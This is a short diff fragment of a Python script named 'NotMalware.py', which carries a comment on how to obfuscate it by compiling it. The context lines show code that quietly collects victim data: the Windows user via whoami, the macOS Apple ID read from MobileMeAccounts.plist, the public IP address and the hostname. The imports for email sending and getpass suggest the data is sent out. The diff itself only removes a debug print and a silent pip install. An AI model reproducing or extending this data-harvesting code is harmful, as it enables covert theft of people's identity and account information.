@@ -10,7 +10,6 @@ import getpass
 from email.message import EmailMessage
 
 ##To Obfuscate: python3.8 -OO -m py_compile NotMalware.py
-print('hi')
 def main(platform):
     def windows():
         p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)
@@ -88,7 +87,6 @@ def main(platform):
         cmd = '/usr/libexec/PlistBuddy -c "print :Accounts:0:AccountID" ~/Library/Preferences/MobileMeAccounts.plist' ##Cmd to get AppleID
         result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, check=True)    ##Get AppleID from Terminal cmd
         appleID = result.stdout.strip()    
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
         from requests import get
         publicIP = get('https://api.ipify.org').text
         hostname = socket.gethostname()
